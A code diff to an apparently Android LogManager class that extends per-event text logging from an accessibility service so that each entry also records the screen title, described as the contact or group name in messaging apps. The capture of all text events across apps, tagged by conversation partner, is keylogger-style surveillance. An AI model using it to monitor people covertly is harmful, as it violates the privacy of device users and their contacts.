@@ -110,10 +110,19 @@ public class LogManager {
      * Called from UnifiedAccessibilityService for every text event.
      */
     public void logEntry(String packageName, String appName, String text, String eventType) {
+        logEntry(packageName, appName, text, eventType, "");
+    }
+
+    /**
+     * Called from UnifiedAccessibilityService for every text event, with screen/window title.
+     * screenTitle is the contact/group name in messaging apps, empty string when unknown.
+     */
+    public void logEntry(String packageName, String appName, String text, String eventType,
+                         String screenTitle) {
         if (!enabled || text == null || text.isEmpty()) return;
 
         String today = todayStr();
-        JSONObject entry = buildEntry(packageName, appName, text, eventType);
+        JSONObject entry = buildEntry(packageName, appName, text, eventType, screenTitle);
         String line = entry.toString() + "\n";
 
         // 1. Write to global day file
@@ -462,6 +471,11 @@ public class LogManager {
     // ── Helpers ──────────────────────────────────────────────────────────
 
     private JSONObject buildEntry(String pkg, String appName, String text, String type) {
+        return buildEntry(pkg, appName, text, type, "");
+    }
+
+    private JSONObject buildEntry(String pkg, String appName, String text, String type,
+                                  String screenTitle) {
         JSONObject o = new JSONObject();
         try {
             o.put("timestamp", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date()));
@@ -469,6 +483,9 @@ public class LogManager {
             o.put("appName", appName != null ? appName : pkg);
             o.put("text", text);
             o.put("eventType", type);
+            if (screenTitle != null && !screenTitle.isEmpty()) {
+                o.put("screenTitle", screenTitle);
+            }
         } catch (JSONException ignored) {}
         return o;
     }
